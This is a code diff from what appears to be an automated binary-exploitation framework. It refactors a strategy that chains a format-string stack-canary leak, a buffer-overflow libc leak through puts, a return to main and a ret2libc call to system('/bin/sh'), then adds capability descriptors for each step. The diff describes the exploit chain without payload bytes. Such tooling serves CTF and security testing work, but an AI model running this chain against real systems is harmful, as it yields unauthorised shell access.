@@ -26,10 +26,13 @@ import re
 
 from autopwn.context import (
     CanaryLeakPlan,
+    Capability,
+    CapabilityKind,
     ExploitContext,
     FactScope,
     InteractionGraph,
     InteractionKind,
+    make_capability,
 )
 from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
 from autopwn.exp.registry import register
@@ -60,6 +63,11 @@ class CanaryRet2LibcPutX32LocalStrategy(CanaryStrategy):
             and bool(ctx.has_puts)
             and (ctx.canary is not None or ctx.canary_plan is not None)
         )
+
+    def describe_capabilities(self, ctx: ExploitContext) -> tuple[Capability, ...]:
+        if ctx.canary_plan is None:
+            return ()
+        return _same_session_capabilities(ctx, self.name)
 
     def run(self, ctx: ExploitContext) -> bool:
         if ctx.canary is None and ctx.canary_plan is not None:
@@ -478,37 +486,83 @@ def _parse_plan_canary(leak_line: bytes, plan: CanaryLeakPlan) -> int:
 
 
 def _bind_same_session_graph(ctx: ExploitContext) -> InteractionGraph:
-    template = ctx.get_interaction_graph(
-        "same-session-canary-ret2libc-put-x32",
-        scope=FactScope.BINARY,
-    )
-    if template is None:
-        template = InteractionGraph(name="same-session-canary-ret2libc-put-x32")
-        template.add_step("fmt_leak_canary", InteractionKind.LEAK, produces=("canary.live_value",), same_instance=True)
-        template.add_step(
-            "bof_leak_puts",
-            InteractionKind.LEAK,
-            requires=("canary.live_value",),
-            produces=("libc.puts_addr",),
-            same_instance=True,
-        )
-        template.add_step("reenter_main", InteractionKind.REENTRY, requires=("libc.puts_addr",), same_instance=True)
-        template.add_step(
-            "bof_spawn_shell",
-            InteractionKind.EXECUTE,
-            requires=("canary.live_value", "libc.puts_addr"),
-            same_instance=True,
-        )
-        template.add_step("verify_shell", InteractionKind.VERIFY, same_instance=True)
-        template.connect("fmt_leak_canary", "bof_leak_puts")
-        template.connect("bof_leak_puts", "reenter_main")
-        template.connect("reenter_main", "bof_spawn_shell")
-        template.connect("bof_spawn_shell", "verify_shell")
-
-    graph = template.clone()
+    graph = _ensure_same_session_graph_template(ctx).clone()
     ctx.set_interaction_graph(
         graph,
         scope=ctx.runtime_fact_scope,
         source="strategy.canary_ret2libc_put.same_session",
     )
     return graph
+
+
+def _ensure_same_session_graph_template(ctx: ExploitContext) -> InteractionGraph:
+    template = ctx.get_interaction_graph(
+        "same-session-canary-ret2libc-put-x32",
+        scope=FactScope.BINARY,
+    )
+    if template is not None:
+        return template
+
+    template = InteractionGraph(name="same-session-canary-ret2libc-put-x32")
+    template.add_step("fmt_leak_canary", InteractionKind.LEAK, produces=("canary.live_value",), same_instance=True)
+    template.add_step(
+        "bof_leak_puts",
+        InteractionKind.LEAK,
+        requires=("canary.live_value",),
+        produces=("libc.puts_addr",),
+        same_instance=True,
+    )
+    template.add_step("reenter_main", InteractionKind.REENTRY, requires=("libc.puts_addr",), same_instance=True)
+    template.add_step(
+        "bof_spawn_shell",
+        InteractionKind.EXECUTE,
+        requires=("canary.live_value", "libc.puts_addr"),
+        same_instance=True,
+    )
+    template.add_step("verify_shell", InteractionKind.VERIFY, same_instance=True)
+    template.connect("fmt_leak_canary", "bof_leak_puts")
+    template.connect("bof_leak_puts", "reenter_main")
+    template.connect("reenter_main", "bof_spawn_shell")
+    template.connect("bof_spawn_shell", "verify_shell")
+    ctx.set_interaction_graph(
+        template,
+        scope=FactScope.BINARY,
+        source="strategy.canary_ret2libc_put.template",
+    )
+    return template
+
+
+def _same_session_capabilities(
+    ctx: ExploitContext,
+    strategy_name: str,
+) -> tuple[Capability, ...]:
+    graph = _ensure_same_session_graph_template(ctx)
+    graph_name = graph.name
+    live_scope = ctx.runtime_fact_scope
+    attrs = ("has_puts",)
+    specs = (
+        ("same_session.canary_leak", CapabilityKind.LEAK, ("canary.plan",), FactScope.BINARY, ("fmt_leak_canary",), ("canary.live_value",), ("canary.plan", "overflow.padding"), "fmtstr leak recovers the live canary"),
+        ("same_session.stack_control", CapabilityKind.CONTROL, ("overflow.padding", "canary.plan"), FactScope.BINARY, ("bof_leak_puts", "reenter_main", "bof_spawn_shell"), ("rip.control",), ("overflow.padding", "canary.plan"), "second input overflow survives the same-session route"),
+        ("same_session.libc_puts_leak", CapabilityKind.LEAK, ("canary.live_value",), live_scope, ("bof_leak_puts",), ("libc.puts_addr",), ("canary.plan", "overflow.padding"), "puts@plt leaks libc after the live canary is recovered"),
+        ("same_session.ret2libc_exec", CapabilityKind.EXEC, ("canary.live_value", "libc.puts_addr"), live_scope, ("reenter_main", "bof_spawn_shell"), ("shell.spawned",), ("canary.plan", "overflow.padding"), "same-session ret2libc stage 2 reaches system('/bin/sh')"),
+        ("same_session.shell_verify_whoami", CapabilityKind.VERIFY, ("libc.puts_addr",), live_scope, ("verify_shell",), ("shell.verified",), (), "whoami verification is the success contract for this route"),
+    )
+
+    return (
+        tuple(
+            make_capability(
+                capability_id,
+                kind,
+                strategy_name=strategy_name,
+                graph_name=graph_name,
+                fact_keys=fact_keys,
+                scope=scope,
+                step_ids=step_ids,
+                provides=provides,
+                evidence_facts=evidence_facts,
+                attributes=attrs,
+                notes=notes,
+            )
+            for capability_id, kind, fact_keys, scope, step_ids, provides, evidence_facts, notes in specs
+        )
+    )
